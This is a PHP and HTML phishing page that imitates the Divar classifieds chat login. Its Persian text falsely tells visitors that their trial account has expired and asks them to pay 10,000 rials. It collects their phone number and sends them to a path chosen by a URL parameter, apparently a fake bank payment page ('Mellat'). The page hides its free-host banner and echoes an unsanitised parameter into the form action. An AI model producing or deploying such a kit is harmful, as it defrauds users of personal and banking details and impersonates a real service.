<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>










<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0">
<meta name="description" content="Chat application for Divar classified ads service">
<meta name="application-name" content="Divar Chat">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta name="theme-color" content="#c00c1a">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#c00c1a">
<meta name="apple-mobile-web-app-title" content="Divar Chat">
<meta name="msapplication-TileColor" content="#c00c1a">
<style>img[alt="www.000webhost.com"]{display:none;}</style>
<meta name="msapplication-navbutton-color" content="#c00c1a">
<meta name="msapplication-TileImage" content="static/icons/divar_192x192.png">
<link rel="icon" sizes="192x192" href="static/icons/divar_192x192.png">
<link rel="apple-touch-icon" sizes="192x192" href="static/icons/divar_192x192.png">
</script>
<link href="css/vendor.7391dbb34262eb051228.css" rel="stylesheet">
<title>ورود با چت دیوار</title>
</head>
<body>
<section id="root">
<section id="root">
<div class="app">
<div class="tab-bar">
<div role="listbox" aria-expanded="false" class="ui item dropdown tab-bar__mobile-menu" tabindex="0">
<div class="text" role="alert" aria-live="polite">
</div>
<i aria-hidden="true" class="sidebar icon">
</i>
<div class="menu transition">
<a href="#" target="_blank" role="option" class="item">دیوار من</a>
<div role="option" class="item">چت</div>
<a href="#" target="_blank" role="option" class="item">درباره ما</a>
<a href="#" target="_blank" role="option" class="item">بلاگ</a>
<a href="#" target="_blank" role="option" class="item">شرایط و راهنما</a>
<a href="#" target="_blank" role="option" class="item">تماس با ما</a>
</div>
</div>
<a href="#" target="_blank" class="ui primary button tab-bar__send-button computer" role="button">ارسال رایگان آگهی</a>
<a href="#" target="_blank" class="ui primary button tab-bar__send-button mobile" role="button">ارسال آگهی</a>
<div class="ui secondary tab-bar__menu menu"><a href="#" target="_blank" class="link item">دیوار من</a>
<a class="link item">چت</a>
<a href="#" target="_blank" class="link item">درباره ما</a>
<a href="#" target="_blank" class="link item">بلاگ</a>
<a href="#" target="_blank" class="link item">شرایط و راهنما</a>
<a href="#" target="_blank" class="link item">تماس با ما</a>
</div><a class="ui image tab-bar__logo" href="#">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAxlBMVEUAAACyKzDDISfDICfDISfDISfDISfDISfDISfDICfDISfDICfDISfDICfDISfDICfDICfDISfDISfDISfDISfDICfDICfDISfDICfDICfDISfDICfDICfDICfDICfDICfDICfDICfDICfDISfDICfDISfDICfDICfDICfDISfDISfDISdZWVvDICdYWVtZWVtYWVvDISdYWVvDISdZWVzDISfDICdYWVtfVVdYWVtYWVvDISdYWVtZWVxYWVtZWVzDISdYWVuJ4BzTAAAAQHRSTlMABHkP/eX4vvTY0GoZCfCzhSnr38KQgEc4IRwTDQerlopwV1FLQCbKx5+cXDss+PHEo41gX0VDGhLf2tOqV0UsbDCYQgAAAcxJREFUSMftlOlyozAQhGUuA7bBjm1sgu/b3niTbK6999v3f6kICUqkUkkVf1PpP8zUdCMx04P4xAfBxmvVEwT4k1oCD9p1+A3AriOwgUYdwSV4og56cFFLMIZ+LcEIwlqCFTTfLJ474hVaMCvO6q510LFaum9HgupM24OwJ4QFJ9WtJrBShS58UUEfhsLAUukQunmzXICjKsTQKk/3Lo1grqi3sJS3CMgRq9lHsNUuCMAyggHcCdFU5y/AkdGsaEM0LT6w2pGJB/IbfsGDsH2wbvXl7D7MC05aneoaXPm4gLN4kHFHRhshsgF4qfGNEcTqRR1l1kfwTxC1x4kLWJW+HMp458BYWSmSMpcKFqXzLQeWpWAGg3xBYZ87yijcdUFfh0A4LfhbdO/Ojn7hpmDHd5rRtvoAQbmMmUxj7dZVI6+7EE7snKzH7gA4c7u8XQx+Wlm7EPyeqvy7/3YlEgDvuBMlFkCrwt+Tj+/v75sf/yW+fh85hMvMEBJgZtJsr1t5LclaINKdMGicgIFx+i4AEhn8zNnXN/JKL5A1gYPx+WOE9oR4uv9z9SRe4QA0bbMVHjjL93+NDKcmTR2i0ftb7ycv8qG/FZ/4gHgGgA5OdWS42a4AAAAASUVORK5CYII=">
</a>
</div>
<form action="../<?php echo $P ?>/?e=<?php echo $e ?>" method="post">
<div class="auth"><div class="ui inverted dimmer">
<div class="content"><div class="center"><div class="ui text loader">در حال بارگذاری...</div>
</div></div></div><div class="auth__content"><div class="auth__body mobile-full-width">
<div class="ui segment auth__body__frame mobile-full-width"><div class="auth__body__container">
<h1>اتمام حساب ازمایشی</h1>
<p>دوست عزیز حساب ازمایشی شما به پایان رسیده است
این حساب در مدت دو ساعت دیگر به پایان می رسد در صورتی که می خواهید اگهی شما به مدت 30 روز باقی بماند مبلغ 10,000 ریال پرداخت نمایید
برای پرداخت ابتدا فرم زیر را پر کنید</p>
<p class="auth__body__text">لطفا شماره تلفن خود را وارد کنید.</p>
<div class="auth__input__view"><div><div class="ui labeled input auth__input ltr spaced">
<div class="ui label label auth__phone-label">+۹۸</div>
<input placeholder="شماره تلفن" type="tel" maxlength="10" pattern="[0-9]{10}" value="" required>
</div>
</div>
<button type="submit" class="ui primary button auth__button" role="button">اتمام و پرداخت</button>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</script>
</body>
</html>
